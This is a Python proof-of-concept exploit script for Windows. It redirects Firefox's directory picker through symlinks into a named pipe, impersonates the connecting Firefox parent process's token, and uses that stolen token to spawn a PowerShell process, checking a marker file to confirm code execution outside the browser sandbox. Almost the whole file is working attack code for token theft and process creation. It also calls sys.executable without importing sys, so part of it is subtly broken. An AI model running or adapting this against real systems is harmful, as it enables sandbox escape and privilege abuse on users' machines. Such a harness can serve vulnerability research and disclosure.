from __future__ import annotations

import ctypes
from ctypes import wintypes
import http.server
import json
import os
import shutil
import socketserver
import subprocess
import tempfile
import threading
import time
import traceback
from pathlib import Path

import psutil
import win32api
import win32con
import win32event
import win32file
import win32pipe
import win32process
import win32profile
import win32security
from pywinauto import Desktop, keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

OUT = Path(os.environ.get('E2E_RESULT_DIR', 'firefox-e2e-results')).resolve()
OUT.mkdir(parents=True, exist_ok=True)
FIREFOX = os.environ['FIREFOX_BINARY']
BASE = Path(tempfile.gettempdir()) / 'firefox-parent-boundary-e2e'
SELECTED = BASE / 'selected'
MARKER = BASE / 'parent-token-marker.txt'
MARKER_TEXT = 'FIREFOX_PARENT_TOKEN_EXEC_36f01c'

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
TOKEN_ALL_ACCESS = 0xF01FF
CREATE_NO_WINDOW = 0x08000000
LOGON_WITH_PROFILE = 1

kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                                 wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD,
                                 wintypes.HANDLE]
kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.GetNamedPipeClientProcessId.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.ULONG)]
kernel32.GetNamedPipeClientProcessId.restype = wintypes.BOOL
advapi32.ImpersonateNamedPipeClient.argtypes = [wintypes.HANDLE]
advapi32.ImpersonateNamedPipeClient.restype = wintypes.BOOL
advapi32.RevertToSelf.restype = wintypes.BOOL


def dump(name, value):
    (OUT / name).write_text(json.dumps(value, indent=2, default=str), encoding='utf-8')


def cmd(args, timeout=30):
    return subprocess.run(args, text=True, capture_output=True, timeout=timeout)


def integrity_name(rid):
    if rid is None: return None
    if rid < 0x1000: return 'untrusted'
    if rid < 0x2000: return 'low'
    if rid < 0x3000: return 'medium'
    if rid < 0x4000: return 'high'
    if rid < 0x5000: return 'system'
    return hex(rid)


def token_info(token):
    result = {}
    try:
        sid, _ = win32security.GetTokenInformation(token, win32security.TokenUser)
        name, domain, sid_type = win32security.LookupAccountSid(None, sid)
        result.update(user=f'{domain}\\{name}', sid=win32security.ConvertSidToStringSid(sid), sid_type=sid_type)
    except Exception as e:
        result['user_error'] = repr(e)
    try:
        value = win32security.GetTokenInformation(token, win32security.TokenIntegrityLevel)
        sid = value[0] if isinstance(value, tuple) else value
        count = win32security.GetSidSubAuthorityCount(sid)
        rid = win32security.GetSidSubAuthority(sid, count - 1)
        result.update(integrity=integrity_name(rid), integrity_rid=rid,
                      integrity_sid=win32security.ConvertSidToStringSid(sid))
    except Exception as e:
        result['integrity_error'] = repr(e)
    for key, cls in [('elevation_type', 18), ('has_restrictions', 21),
                     ('is_app_container', 29), ('session_id', win32security.TokenSessionId)]:
        try: result[key] = win32security.GetTokenInformation(token, cls)
        except Exception as e: result[key + '_error'] = repr(e)
    try:
        privs = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
        result['enabled_privileges'] = [win32security.LookupPrivilegeName(None, luid)
                                        for luid, attrs in privs
                                        if attrs & win32con.SE_PRIVILEGE_ENABLED]
    except Exception as e:
        result['privilege_error'] = repr(e)
    return result


def process_info(pid):
    result = {'pid': int(pid)}
    try:
        hp = win32api.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, int(pid))
        token = win32security.OpenProcessToken(hp, win32con.TOKEN_QUERY)
        result.update(token_info(token))
    except Exception as e:
        result['token_error'] = repr(e)
    try:
        p = psutil.Process(int(pid))
        result.update(name=p.name(), exe=p.exe(), ppid=p.ppid(), cmdline=p.cmdline())
    except Exception as e:
        result['process_error'] = repr(e)
    return result


def spawn_with_token(token):
    result = {'attempted': True, 'marker': str(MARKER)}
    MARKER.unlink(missing_ok=True)
    try:
        primary = win32security.DuplicateTokenEx(token, TOKEN_ALL_ACCESS, None,
                                                 win32security.SecurityImpersonation,
                                                 win32security.TokenPrimary)
        result['duplicate_token'] = True
    except Exception as e:
        result.update(duplicate_token=False, duplicate_error=repr(e))
        return result
    command = ('powershell.exe -NoLogo -NoProfile -NonInteractive '
               f'-Command "Set-Content -NoNewline -LiteralPath \'{MARKER}\' '
               f'-Value \'{MARKER_TEXT}\'"')
    try:
        env = win32profile.CreateEnvironmentBlock(primary, False)
        hp, ht, pid, tid = win32process.CreateProcessAsUser(
            primary, None, command, None, None, False,
            CREATE_NO_WINDOW | win32con.CREATE_UNICODE_ENVIRONMENT,
            env, str(BASE), win32process.STARTUPINFO())
        result.update(method='CreateProcessAsUser', pid=pid)
        win32event.WaitForSingleObject(hp, 15000)
        result['exit_code'] = win32process.GetExitCodeProcess(hp)
    except Exception as e:
        result['CreateProcessAsUser_error'] = repr(e)
        class STARTUPINFOW(ctypes.Structure):
            _fields_ = [('cb', wintypes.DWORD), ('lpReserved', wintypes.LPWSTR),
                        ('lpDesktop', wintypes.LPWSTR), ('lpTitle', wintypes.LPWSTR),
                        ('dwX', wintypes.DWORD), ('dwY', wintypes.DWORD),
                        ('dwXSize', wintypes.DWORD), ('dwYSize', wintypes.DWORD),
                        ('dwXCountChars', wintypes.DWORD), ('dwYCountChars', wintypes.DWORD),
                        ('dwFillAttribute', wintypes.DWORD), ('dwFlags', wintypes.DWORD),
                        ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD),
                        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
                        ('hStdInput', wintypes.HANDLE), ('hStdOutput', wintypes.HANDLE),
                        ('hStdError', wintypes.HANDLE)]
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [('hProcess', wintypes.HANDLE), ('hThread', wintypes.HANDLE),
                        ('dwProcessId', wintypes.DWORD), ('dwThreadId', wintypes.DWORD)]
        si, pi = STARTUPINFOW(), PROCESS_INFORMATION()
        si.cb = ctypes.sizeof(si)
        mutable = ctypes.create_unicode_buffer(command)
        advapi32.CreateProcessWithTokenW.argtypes = [wintypes.HANDLE, wintypes.DWORD,
            wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.DWORD, wintypes.LPVOID,
            wintypes.LPCWSTR, ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)]
        advapi32.CreateProcessWithTokenW.restype = wintypes.BOOL
        ok = advapi32.CreateProcessWithTokenW(int(primary), LOGON_WITH_PROFILE, None,
                                               mutable, CREATE_NO_WINDOW, None,
                                               str(BASE), ctypes.byref(si), ctypes.byref(pi))
        if ok:
            result.update(method='CreateProcessWithTokenW', pid=int(pi.dwProcessId))
            kernel32.WaitForSingleObject(pi.hProcess, 15000)
            code = wintypes.DWORD()
            kernel32.GetExitCodeProcess(pi.hProcess, ctypes.byref(code))
            result['exit_code'] = int(code.value)
            kernel32.CloseHandle(pi.hThread); kernel32.CloseHandle(pi.hProcess)
        else:
            result['CreateProcessWithTokenW_error'] = ctypes.get_last_error()
    for _ in range(60):
        if MARKER.exists(): break
        time.sleep(.25)
    result['marker_exists'] = MARKER.exists()
    result['marker_text'] = MARKER.read_text(errors='replace') if MARKER.exists() else None
    return result


class PipeServer:
    def __init__(self, basename):
        self.basename = basename
        self.path = rf'\\.\pipe\{basename}'
        self.result = {'pipe': self.path, 'connected': False, 'impersonated': False}
        self.ready, self.done = threading.Event(), threading.Event()
        self.thread = threading.Thread(target=self.run, daemon=True)
    def start(self):
        self.thread.start()
        if not self.ready.wait(10): raise TimeoutError('pipe server not ready')
    def run(self):
        pipe = None
        try:
            pipe = win32pipe.CreateNamedPipe(
                self.path, win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_BYTE | win32pipe.PIPE_READMODE_BYTE | win32pipe.PIPE_WAIT,
                1, 65536, 65536, 0, None)
            self.ready.set()
            try: win32pipe.ConnectNamedPipe(pipe, None)
            except Exception as e:
                if getattr(e, 'winerror', None) != 535: raise
            self.result['connected'] = True
            pid = wintypes.ULONG()
            if kernel32.GetNamedPipeClientProcessId(int(pipe), ctypes.byref(pid)):
                self.result['client_pid'] = int(pid.value)
            else:
                self.result['client_pid_error'] = ctypes.get_last_error()
            if advapi32.ImpersonateNamedPipeClient(int(pipe)):
                self.result['impersonated'] = True
                token = win32security.OpenThreadToken(win32api.GetCurrentThread(), TOKEN_ALL_ACCESS, True)
                self.result['client_token'] = token_info(token)
                advapi32.RevertToSelf()
                self.result['token_execution'] = spawn_with_token(token)
            else:
                self.result['impersonation_error'] = ctypes.get_last_error()
            try:
                win32file.WriteFile(pipe, b'FIREFOX_PIPE_READ_36f01c')
                self.result['wrote_marker'] = True
            except Exception as e:
                self.result['write_error'] = repr(e)
        except Exception as e:
            self.result.update(server_error=repr(e), traceback=traceback.format_exc())
            self.ready.set()
        finally:
            if pipe is not None:
                try: win32file.CloseHandle(pipe)
                except Exception: pass
            self.done.set()


def make_link(link, target):
    if os.path.lexists(link): cmd(['cmd.exe', '/d', '/c', 'rmdir', str(link)])
    p = cmd(['cmd.exe', '/d', '/c', 'mklink', '/D', str(link), target])
    return {'link':str(link), 'target':target, 'returncode':p.returncode,
            'stdout':p.stdout, 'stderr':p.stderr, 'lexists':os.path.lexists(link)}


def native_open(path):
    code = r'''import ctypes,sys
from ctypes import wintypes
k=ctypes.WinDLL("kernel32",use_last_error=True)
k.CreateFileW.argtypes=[wintypes.LPCWSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.HANDLE]
k.CreateFileW.restype=wintypes.HANDLE
h=k.CreateFileW(sys.argv[1],0x80000000,7,None,3,0,None)
print(int(h) if h else 0, ctypes.get_last_error())
'''
    try:
        p = cmd([sys.executable, '-c', code, str(path)], timeout=8)
        return {'returncode':p.returncode, 'stdout':p.stdout, 'stderr':p.stderr}
    except Exception as e:
        return {'error':repr(e)}


def native_matrix():
    targets = [('dot', r'\\.\pipe'), ('localhost', r'\\localhost\pipe'),
               ('loopback', r'\\127.0.0.1\pipe'), ('extended', r'\\?\pipe'),
               ('extended_unc', r'\\?\UNC\localhost\pipe')]
    rows=[]
    for i,(label,target) in enumerate(targets):
        basename=f'ff_native_{i}_{os.getpid()}'
        link=SELECTED/f'native-{label}'
        setup=make_link(link,target)
        server=PipeServer(basename); server.start()
        client=native_open(link/basename)
        server.done.wait(5)
        rows.append({'label':label,'setup':setup,'client':client,'server':server.result})
    return rows


def start_http():
    class H(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass
    handler=lambda *a,**kw:H(*a,directory=str(Path(__file__).parent),**kw)
    server=socketserver.TCPServer(('127.0.0.1',0),handler)
    threading.Thread(target=server.serve_forever,daemon=True).start()
    return server,server.server_address[1]


def select_folder(driver, path):
    result={}
    driver.find_element(By.ID,'picker').click()
    dialog=None
    end=time.time()+20
    while time.time()<end and not dialog:
        for w in Desktop(backend='uia').windows():
            title=(w.window_text() or '').lower()
            if any(x in title for x in ('file upload','select folder','choose folder','upload')):
                dialog=w; break
        time.sleep(.2)
    if not dialog:
        result['error']='picker dialog not found'; return result
    result['title']=dialog.window_text(); dialog.set_focus()
    try:
        keyboard.send_keys('^l'); time.sleep(.3)
        keyboard.send_keys(str(path), with_spaces=True); keyboard.send_keys('{ENTER}'); time.sleep(1)
        clicked=False
        for caption in ('Select Folder','Choose Folder','Open','Select'):
            try:
                b=dialog.child_window(title_re=rf'(?i)^{caption}$',control_type='Button')
                if b.exists(timeout=.3) and b.is_enabled(): b.click(); clicked=True; result['button']=caption; break
            except Exception: pass
        if not clicked: keyboard.send_keys('{ENTER}'); result['button']='ENTER'
    except Exception as e: result['dialog_error']=repr(e)
    end=time.time()+20
    while time.time()<end:
        try:
            phase=driver.execute_script('return window.lab && window.lab.phase')
            if phase in ('selected','no-root'): result['phase']=phase; return result
        except Exception: pass
        try:
            for w in Desktop(backend='uia').windows():
                for caption in ('Upload','Allow','OK','Open'):
                    try:
                        b=w.child_window(title_re=rf'(?i)^{caption}$',control_type='Button')
                        if b.exists(timeout=.1) and b.is_enabled(): b.click(); result['confirmation']=caption
                    except Exception: pass
        except Exception: pass
        time.sleep(.25)
    result['phase']='timeout'; return result


def main():
    result={'verdict':'NOT_CONFIRMED','started':time.time(),'base':str(BASE)}
    driver=httpd=None
    try:
        if BASE.exists(): shutil.rmtree(BASE,ignore_errors=True)
        SELECTED.mkdir(parents=True); (SELECTED/'inside.txt').write_text('INSIDE_ONLY')
        matrix=native_matrix(); result['native_matrix']=matrix
        chosen=next((r for r in matrix if r['setup']['returncode']==0 and r['server'].get('connected')),None)
        result['chosen']=chosen['label'] if chosen else None
        if not chosen:
            result['verdict']='NATIVE_REPARSE_TO_PIPE_NOT_REPRODUCED'; return result
        target=chosen['setup']['target']
        result['browser_link']=make_link(SELECTED/'pipe-link',target)
        httpd,port=start_http(); result['port']=port
        o=Options(); o.binary_location=FIREFOX
        for k,v in {'dom.webkitBlink.filesystem.enabled':True,'dom.webkitBlink.dirPicker.enabled':True,
                    'browser.shell.checkDefaultBrowser':False,'datareporting.policy.dataSubmissionEnabled':False}.items():
            o.set_preference(k,v)
        driver=webdriver.Firefox(options=o); result['capabilities']=dict(driver.capabilities)
        parent_pid=int(driver.capabilities.get('moz:processID') or 0); result['parent_pid']=parent_pid
        driver.get(f'http://127.0.0.1:{port}/index.html'); time.sleep(1)
        result['picker']=select_folder(driver,SELECTED)
        result['page_pre']=driver.execute_script('return window.lab')
        ff=[]
        for p in psutil.process_iter(['pid','name']):
            if (p.info['name'] or '').lower()=='firefox.exe': ff.append(process_info(p.info['pid']))
        result['firefox_tokens']=ff
        basename=f'firefox_parent_{os.getpid()}'
        server=PipeServer(basename); server.start()
        try:
            driver.set_script_timeout(15)
            result['browser_call']=driver.execute_async_script(
                "const done=arguments[arguments.length-1]; window.triggerPath(arguments[0]).then(done,e=>done({stage:'promise-error',error:String(e)}));",
                f'pipe-link/{basename}')
        except Exception as e: result['browser_call']={'stage':'webdriver-error','error':repr(e)}
        server.done.wait(15); result['pipe_server']=server.result
        try: result['page_post']=driver.execute_script('return window.lab')
        except Exception as e: result['page_post_error']=repr(e)
        client_pid=int(server.result.get('client_pid') or 0)
        tok=server.result.get('client_token') or {}; execution=server.result.get('token_execution') or {}
        conditions={
            'native_path_works':True,
            'pipe_connected':bool(server.result.get('connected')),
            'client_is_firefox_parent':bool(parent_pid and client_pid==parent_pid),
            'impersonation_succeeded':bool(server.result.get('impersonated')),
            'token_outside_content_sandbox':tok.get('integrity') in ('medium','high','system'),
            'marker_process_executed':execution.get('marker_exists') and execution.get('marker_text')==MARKER_TEXT,
        }
        result['proof_conditions']=conditions
        result['verdict']='CONFIRMED_FIREFOX_PARENT_TOKEN_CODE_EXECUTION' if all(conditions.values()) else ('PARTIAL_PIPE_CONNECTION' if conditions['pipe_connected'] else 'FIREFOX_PIPE_CONNECTION_NOT_REPRODUCED')
    except Exception as e:
        result.update(fatal_error=repr(e),fatal_traceback=traceback.format_exc())
    finally:
        result['finished']=time.time(); dump('result.json',result)
        try:
            if driver: driver.save_screenshot(str(OUT/'firefox.png')); driver.quit()
        except Exception: pass
        try:
            if httpd: httpd.shutdown()
        except Exception: pass
    return 0 if result.get('verdict')=='CONFIRMED_FIREFOX_PARENT_TOKEN_CODE_EXECUTION' else 3

if __name__=='__main__': raise SystemExit(main())
